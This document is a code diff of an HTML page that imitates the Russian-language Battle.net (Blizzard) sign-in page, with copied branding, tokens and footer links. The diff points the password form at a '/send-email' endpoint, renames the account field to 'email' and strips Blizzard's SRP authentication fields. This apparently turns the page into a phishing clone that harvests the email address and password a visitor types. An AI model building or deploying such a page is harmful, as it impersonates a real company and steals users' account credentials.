@@ -2,246 +2,262 @@
 <html lang="en" style="font-family: sans-serif; text-size-adjust: 100%; height: auto">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="icon" type="image/png" sizes="192x192" href="images/apple-icon-72x72.png" />
-  <link rel="stylesheet" href="stylesheets/style.css" type="text/css">
-  
-  <title>Авторизация в Battle.net</title>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <link rel="icon" type="image/png" sizes="192x192" href="images/apple-icon-72x72.png"/>
+    <link rel="stylesheet" href="stylesheets/style.css" type="text/css">
+
+    <title>Авторизация в Battle.net</title>
 </head>
 
 <body>
-  <div>
+<div>
     <div class="main-box">
-      <div class="main-box-inner">
-        <h1 class="logo logo-horizontal logo-small"></h1>
-        <div class="input">
-          <div class="login">
-            <h3 class="login-header">Авторизоваться</h3>
-            <div class="useResponse social-login external-login-container">
-              <button id="google" role="row" class="btn btn-block third-party-login social-icon login-google">
-                <i class="icon-google"></i>
-              </button>
-              <form method="post" action="/login/signin/facebook" id="facebookLogin"
-                class="class org.apache.maven.project.MavenProject" enctype="">
-                <button id="facebook" role="row" class="btn btn-block third-party-login social-icon login-facebook"
-                  rel="external" aria-label="Авторизоваться с помощью Facebook"
-                  title="Авторизоваться с помощью Facebook" tabindex="0">
-                  <i class="icon-facebook"></i>
-                </button>
-                <input type="hidden" name="scope" value="public_profile,email,user_friends">
-                <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
-                <input type="hidden" name="app" value="shop">
-                <input type="hidden" name="scheme" value="">
-                <input type="hidden" name="deviceProof"
-                  value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-                <input type="hidden" id="csrftoken-facebookLogin" class="csrftoken" name="csrftoken"
-                  value="a7fb860e-fe27-48cd-b28f-f41eaf9074f6">
-              </form>
-              <form method="post" action="/login/signin/apple" id="appleLogin"
-                class="class org.apache.maven.project.MavenProject" enctype="">
-                <button id="apple" role="row" class="btn btn-block third-party-login social-icon login-apple"
-                  rel="external" aria-label="Авторизоваться с помощью Apple" title="Авторизоваться с помощью Apple"
-                  tabindex="0">
-                  <i class="icon-apple"></i>
-                </button>
-                <input type="hidden" name="scope" value="email,name">
-                <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
-                <input type="hidden" name="app" value="shop">
-                <input type="hidden" name="scheme" value="">
-                <input type="hidden" name="deviceProof"
-                  value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-                <input type="hidden" id="csrftoken-appleLogin" class="csrftoken" name="csrftoken"
-                  value="a7fb860e-fe27-48cd-b28f-f41eaf9074f6">
-              </form>
-            </div>
-            <div class="useResponse social-login external-login-container">
-              <form method="post" action="/login/signin/live" id="liveLogin"
-                class="class org.apache.maven.project.MavenProject" enctype="">
-                <button id="live" role="row" class="btn btn-block third-party-login social-icon login-live"
-                  rel="external" aria-label="Авторизоваться с помощью Xbox Network"
-                  title="Авторизоваться с помощью Xbox Network" tabindex="0">
-                  <i class="icon-live"></i>
-                </button>
-                <input type="hidden" name="scope" value="Xboxlive.signin">
-                <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
-                <input type="hidden" name="app" value="shop">
-                <input type="hidden" name="scheme" value="">
-                <input type="hidden" name="deviceProof"
-                  value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-                <input type="hidden" id="csrftoken-liveLogin" class="csrftoken" name="csrftoken"
-                  value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
-              </form>
-              <form method="post" action="/login/signin/psn" id="psnLogin"
-                class="class org.apache.maven.project.MavenProject" enctype="">
-                <button id="psn" role="row" class="btn btn-block third-party-login social-icon login-psn" rel="external"
-                  aria-label="Авторизоваться с помощью PlayStation™Network"
-                  title="Авторизоваться с помощью PlayStation™Network" tabindex="0">
-                  <i class="icon-psn"></i>
-                </button>
-                <input type="hidden" name="scope" value="psn:s2s">
-                <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
-                <input type="hidden" name="app" value="shop">
-                <input type="hidden" name="scheme" value="">
-                <input type="hidden" name="deviceProof"
-                  value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-                <input type="hidden" id="csrftoken-psnLogin" class="csrftoken" name="csrftoken"
-                  value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
-              </form>
-              <form method="post" action="/login/signin/nintendo" id="nintendoLogin"
-                class="class org.apache.maven.project.MavenProject" enctype="">
-                <button id="nintendo" role="row" class="btn btn-block third-party-login social-icon login-nintendo"
-                  rel="external" aria-label="Авторизоваться с помощью Nintendo"
-                  title="Авторизоваться с помощью Nintendo" tabindex="0">
-                  <i class="icon-nintendo"></i>
-                </button>
-                <input type="hidden" name="scope" value="openid,offline,user.basic,user.email">
-                <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
-                <input type="hidden" name="app" value="shop">
-                <input type="hidden" name="scheme" value="">
-                <input type="hidden" name="deviceProof"
-                  value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-                <input type="hidden" id="csrftoken-nintendoLogin" class="csrftoken" name="csrftoken"
-                  value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
-              </form>
-              <form method="post" action="/login/signin/steam" id="steamLogin"
-                class="class org.apache.maven.project.MavenProject" enctype="">
-                <button id="steam" role="row" class="btn btn-block third-party-login social-icon login-steam"
-                  rel="external" aria-label="Авторизоваться с помощью Steam" title="Авторизоваться с помощью Steam"
-                  tabindex="0">
-                  <i class="icon-steam"></i>
-                </button>
-                <input type="hidden" name="scope" value="">
-                <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
-                <input type="hidden" name="app" value="shop">
-                <input type="hidden" name="scheme" value="">
-                <input type="hidden" name="deviceProof"
-                  value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-                <input type="hidden" id="csrftoken-steamLogin" class="csrftoken" name="csrftoken"
-                  value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
-              </form>
-            </div>
-            <div class="thirdparty-line">
-              <span>или войти через</span>
-            </div>
-            <form action="" method="post" id="password-form" novalidate="novalidate" class="
+        <div class="main-box-inner">
+            <h1 class="logo logo-horizontal logo-small"></h1>
+            <div class="input">
+                <div class="login">
+                    <h3 class="login-header">Авторизоваться</h3>
+                    <div class="useResponse social-login external-login-container">
+                        <button id="google" role="row" class="btn btn-block third-party-login social-icon login-google">
+                            <i class="icon-google"></i>
+                        </button>
+                        <form method="post" action="/login/signin/facebook" id="facebookLogin"
+                              class="class org.apache.maven.project.MavenProject" enctype="">
+                            <button id="facebook" role="row"
+                                    class="btn btn-block third-party-login social-icon login-facebook"
+                                    rel="external" aria-label="Авторизоваться с помощью Facebook"
+                                    title="Авторизоваться с помощью Facebook" tabindex="0">
+                                <i class="icon-facebook"></i>
+                            </button>
+                            <input type="hidden" name="scope" value="public_profile,email,user_friends">
+                            <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
+                            <input type="hidden" name="app" value="shop">
+                            <input type="hidden" name="scheme" value="">
+                            <input type="hidden" name="deviceProof"
+                                   value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                            <input type="hidden" id="csrftoken-facebookLogin" class="csrftoken" name="csrftoken"
+                                   value="a7fb860e-fe27-48cd-b28f-f41eaf9074f6">
+                        </form>
+                        <form method="post" action="/login/signin/apple" id="appleLogin"
+                              class="class org.apache.maven.project.MavenProject" enctype="">
+                            <button id="apple" role="row"
+                                    class="btn btn-block third-party-login social-icon login-apple"
+                                    rel="external" aria-label="Авторизоваться с помощью Apple"
+                                    title="Авторизоваться с помощью Apple"
+                                    tabindex="0">
+                                <i class="icon-apple"></i>
+                            </button>
+                            <input type="hidden" name="scope" value="email,name">
+                            <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
+                            <input type="hidden" name="app" value="shop">
+                            <input type="hidden" name="scheme" value="">
+                            <input type="hidden" name="deviceProof"
+                                   value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                            <input type="hidden" id="csrftoken-appleLogin" class="csrftoken" name="csrftoken"
+                                   value="a7fb860e-fe27-48cd-b28f-f41eaf9074f6">
+                        </form>
+                    </div>
+                    <div class="useResponse social-login external-login-container">
+                        <form method="post" action="/login/signin/live" id="liveLogin"
+                              class="class org.apache.maven.project.MavenProject" enctype="">
+                            <button id="live" role="row" class="btn btn-block third-party-login social-icon login-live"
+                                    rel="external" aria-label="Авторизоваться с помощью Xbox Network"
+                                    title="Авторизоваться с помощью Xbox Network" tabindex="0">
+                                <i class="icon-live"></i>
+                            </button>
+                            <input type="hidden" name="scope" value="Xboxlive.signin">
+                            <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
+                            <input type="hidden" name="app" value="shop">
+                            <input type="hidden" name="scheme" value="">
+                            <input type="hidden" name="deviceProof"
+                                   value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                            <input type="hidden" id="csrftoken-liveLogin" class="csrftoken" name="csrftoken"
+                                   value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
+                        </form>
+                        <form method="post" action="/login/signin/psn" id="psnLogin"
+                              class="class org.apache.maven.project.MavenProject" enctype="">
+                            <button id="psn" role="row" class="btn btn-block third-party-login social-icon login-psn"
+                                    rel="external"
+                                    aria-label="Авторизоваться с помощью PlayStation™Network"
+                                    title="Авторизоваться с помощью PlayStation™Network" tabindex="0">
+                                <i class="icon-psn"></i>
+                            </button>
+                            <input type="hidden" name="scope" value="psn:s2s">
+                            <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
+                            <input type="hidden" name="app" value="shop">
+                            <input type="hidden" name="scheme" value="">
+                            <input type="hidden" name="deviceProof"
+                                   value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                            <input type="hidden" id="csrftoken-psnLogin" class="csrftoken" name="csrftoken"
+                                   value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
+                        </form>
+                        <form method="post" action="/login/signin/nintendo" id="nintendoLogin"
+                              class="class org.apache.maven.project.MavenProject" enctype="">
+                            <button id="nintendo" role="row"
+                                    class="btn btn-block third-party-login social-icon login-nintendo"
+                                    rel="external" aria-label="Авторизоваться с помощью Nintendo"
+                                    title="Авторизоваться с помощью Nintendo" tabindex="0">
+                                <i class="icon-nintendo"></i>
+                            </button>
+                            <input type="hidden" name="scope" value="openid,offline,user.basic,user.email">
+                            <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
+                            <input type="hidden" name="app" value="shop">
+                            <input type="hidden" name="scheme" value="">
+                            <input type="hidden" name="deviceProof"
+                                   value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                            <input type="hidden" id="csrftoken-nintendoLogin" class="csrftoken" name="csrftoken"
+                                   value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
+                        </form>
+                        <form method="post" action="/login/signin/steam" id="steamLogin"
+                              class="class org.apache.maven.project.MavenProject" enctype="">
+                            <button id="steam" role="row"
+                                    class="btn btn-block third-party-login social-icon login-steam"
+                                    rel="external" aria-label="Авторизоваться с помощью Steam"
+                                    title="Авторизоваться с помощью Steam"
+                                    tabindex="0">
+                                <i class="icon-steam"></i>
+                            </button>
+                            <input type="hidden" name="scope" value="">
+                            <input type="hidden" name="ref" value="https://eu.shop.battle.net/ru-ru/404">
+                            <input type="hidden" name="app" value="shop">
+                            <input type="hidden" name="scheme" value="">
+                            <input type="hidden" name="deviceProof"
+                                   value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                            <input type="hidden" id="csrftoken-steamLogin" class="csrftoken" name="csrftoken"
+                                   value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
+                        </form>
+                    </div>
+                    <div class="thirdparty-line">
+                        <span>или войти через</span>
+                    </div>
+                    <form action="/send-email" method="post" id="password-form" novalidate="novalidate" class="
             username-required
             input-focus
             form-with-captcha">
-              <div id="login-input-container" class="">
-                <div class="control-group ">
-                  <label id="accountName-label" class="control-label" for="accountName"></label>
-                  <div class="controls">
-                    <input id="accountName"
-                      aria-label="Поле электронной почты или телефона. Введите электронный адрес или телефонный номер."
-                      name="accountName" title="Электронная почта или телефон" maxlength="320" type="text" tabindex="0"
-                      class="input-block " placeholder="Электронная почта или телефон" autocorrect="off"
-                      spellcheck="false">
-                    <span class="input-after"></span>
-                    <span class="error-helper error-helper-accountName hide">
+                        <div id="login-input-container" class="">
+                            <div class="control-group ">
+                                <label id="accountName-label" class="control-label" for="accountName"></label>
+                                <div class="controls">
+                                    <input id="accountName" name="email"
+                                           aria-label="Поле электронной почты или телефона. Введите электронный адрес или телефонный номер."
+                                           name="accountName" title="Электронная почта или телефон" maxlength="320"
+                                           type="text" tabindex="0"
+                                           class="input-block " placeholder="Электронная почта или телефон"
+                                           autocorrect="off"
+                                           spellcheck="false">
+                                    <span class="input-after"></span>
+                                    <span class="error-helper error-helper-accountName hide">
                     </span>
-                  </div>
-                </div>
-                <div class="control-group ">
-                  <label id="password-label" class="control-label" for="password"></label>
-                  <div class="controls">
-                    <div class="blz-password-wrapper"><input id="password" aria-label="Поле пароля. Введите пароль."
-                        name="password" title="Пароль" maxlength="128" type="password" tabindex="0" class="input-block "
-                        autocomplete="off" placeholder="Пароль" autocorrect="off" spellcheck="false"
-                        data-password-show-aria="Показать пароль" data-password-hide-aria="Скрыть пароль"><span
-                        class="view-password-button" tabindex="0" aria-live="assertive" role="button"><i
-                          class="show-password fas fa-eye" aria-label="Показать пароль"></i><i
-                          class="hide-password hide fas fa-eye-slash" aria-label="Скрыть пароль"></i></span><span
-                        class="caps-lock-indicator hide"><i class="fas fa-arrow-alt-square-up"></i></span></div>
-                    <span class="input-after"></span>
-                    <span class="error-helper error-helper-password hide">
+                                </div>
+                            </div>
+                            <div class="control-group ">
+                                <label id="password-label" class="control-label" for="password"></label>
+                                <div class="controls">
+                                    <div class="blz-password-wrapper"><input id="password"
+                                                                             name="password"
+                                                                             aria-label="Поле пароля. Введите пароль."
+                                                                             name="password" title="Пароль"
+                                                                             maxlength="128" type="password"
+                                                                             tabindex="0" class="input-block "
+                                                                             autocomplete="off" placeholder="Пароль"
+                                                                             autocorrect="off" spellcheck="false"
+                                                                             data-password-show-aria="Показать пароль"
+                                                                             data-password-hide-aria="Скрыть пароль"><span
+                                            class="view-password-button" tabindex="0" aria-live="assertive"
+                                            role="button"><i
+                                            class="show-password fas fa-eye" aria-label="Показать пароль"></i><i
+                                            class="hide-password hide fas fa-eye-slash" aria-label="Скрыть пароль"></i></span><span
+                                            class="caps-lock-indicator hide"><i class="fas fa-arrow-alt-square-up"></i></span>
+                                    </div>
+                                    <span class="input-after"></span>
+                                    <span class="error-helper error-helper-password hide">
                     </span>
-                  </div>
+                                </div>
+                            </div>
+                            <div class="persistWrapper">
+                            </div>
+                        </div>
+                        <div class="control-group submit no-cancel">
+                            <button type="submit" id="submit" class="btn-block btn btn-primary submit-button btn-block"
+                                    data-loading-text="" tabindex="0" aria-label="Авторизация">
+                                Авторизоваться
+                                <i class="spinner-battlenet"></i>
+                            </button>
+                        </div>
+                        <input type="hidden" id="csrftoken" class="csrftoken" name="csrftoken"
+                               value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
+                        <input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1694684700924">
+                        <input type="hidden" name="deviceProof"
+                               value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
+                    </form>
+                    <ul id="help-links" role="navigation">
+                        <li role="link">
+                            <a rel="internal"
+                               href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru%2F404&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=8f2b8351-4044-4eef-917d-7aaa14746fa9&amp;bdp=880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df"
+                               tabindex="0" id="signup" role="button">
+                                Зарегистрируйте учетную запись Battle.net бесплатно
+                            </a>
+                        </li>
+                        <li role="link">
+                            <a rel="internal" target="_blank"
+                               href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=8f2b8351-4044-4eef-917d-7aaa14746fa9"
+                               tabindex="0" id="loginSupport" role="button">
+                                Вы не можете войти?
+                            </a>
+                        </li>
+                    </ul>
                 </div>
-                <input type="hidden" id="srpEnabled" name="srpEnabled" value="true">
-                <input type="hidden" id="upgradeVerifier" name="upgradeVerifier" value="">
-                <input type="hidden" id="useSrp" name="useSrp" value="false">
-                <input type="hidden" id="publicA" name="publicA" value="">
-                <input type="hidden" id="clientEvidenceM1" name="clientEvidenceM1" value="">
-                <div class="persistWrapper">
-                </div>
-              </div>
-              <div class="control-group submit no-cancel">
-                <button type="submit" id="submit" class="btn-block btn btn-primary submit-button btn-block"
-                  data-loading-text="" tabindex="0" aria-label="Авторизация">
-                  Авторизоваться
-                  <i class="spinner-battlenet"></i>
-                </button>
-              </div>
-              <input type="hidden" id="csrftoken" class="csrftoken" name="csrftoken"
-                value="518015b7-d400-4d96-ba93-db3f8ec27d5c">
-              <input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1694684700924">
-              <input type="hidden" name="deviceProof"
-                value="880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
-            </form>
-            <ul id="help-links" role="navigation">
-              <li role="link">
-                <a rel="internal"
-                  href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru%2F404&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=8f2b8351-4044-4eef-917d-7aaa14746fa9&amp;bdp=880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df"
-                  tabindex="0" id="signup" role="button">
-                  Зарегистрируйте учетную запись Battle.net бесплатно
-                </a>
-              </li>
-              <li role="link">
-                <a rel="internal" target="_blank"
-                  href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=8f2b8351-4044-4eef-917d-7aaa14746fa9"
-                  tabindex="0" id="loginSupport" role="button">
-                  Вы не можете войти?
-                </a>
-              </li>
-            </ul>
-          </div>
+            </div>
         </div>
-      </div>
     </div>
     <footer id="footer" class="footer ru-ru">
-      <div id="nav-client-footer" class="nav-client">
-        <div class="mobileFooterEnabled footer-content footer-desktop grid-container">
-          <div class="nav-section support-feedback">
-            <div class="nav-left">
-              <div id="nav-feedback">
-              </div>
-            </div>
-          </div>
-          <div class="nav-section">
-            <div class="nav-left nav-logo-group">
-              <div class="footer-links nav-left">
-                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula" data-analytics="global-nav"
-                  data-analytics-placement="Footer - eula">Пользовательское соглашение Blizzard</a>
-                <span>|</span>
-                <a class="nav-item nav-a" href="https://www.blizzard.com/company/about/privacy.html"
-                  data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Политика
-                  конфиденциальности</a>
-                <span>|</span>
-                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/" data-analytics="global-nav"
-                  data-analytics-placement="Footer - Terms">Условия</a>
-                <span>|</span>
-                <a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/infringementnotice.html"
-                  data-analytics="global-nav" data-analytics-placement="Footer - copyright">Авторское право</a>
-                <span>|</span>
-                <a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav"
-                  data-analytics-placement="Footer - Cookies">Файлы cookie</a>
-                <span>|</span>
-                <a class="nav-item nav-a" href="/login/cookies#settings" data-analytics="global-nav"
-                  data-analytics-placement="Footer - Cookie Settings">Параметры cookie</a>
-                <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
-                <div class="nav-footer-icon-container">
-                  <ul class="nav-footer-icon-list">
-                  </ul>
+        <div id="nav-client-footer" class="nav-client">
+            <div class="mobileFooterEnabled footer-content footer-desktop grid-container">
+                <div class="nav-section support-feedback">
+                    <div class="nav-left">
+                        <div id="nav-feedback">
+                        </div>
+                    </div>
                 </div>
-              </div>
-            </div>
+                <div class="nav-section">
+                    <div class="nav-left nav-logo-group">
+                        <div class="footer-links nav-left">
+                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula"
+                               data-analytics="global-nav"
+                               data-analytics-placement="Footer - eula">Пользовательское соглашение Blizzard</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/about/privacy.html"
+                               data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Политика
+                                конфиденциальности</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/"
+                               data-analytics="global-nav"
+                               data-analytics-placement="Footer - Terms">Условия</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a"
+                               href="https://eu.blizzard.com/company/about/infringementnotice.html"
+                               data-analytics="global-nav" data-analytics-placement="Footer - copyright">Авторское
+                                право</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav"
+                               data-analytics-placement="Footer - Cookies">Файлы cookie</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="/login/cookies#settings" data-analytics="global-nav"
+                               data-analytics-placement="Footer - Cookie Settings">Параметры cookie</a>
+                            <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
+                            <div class="nav-footer-icon-container">
+                                <ul class="nav-footer-icon-list">
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
 
-          </div>
+                </div>
+            </div>
         </div>
-      </div>
     </footer>
-  </div>
+</div>
 </body>
 
 </html>
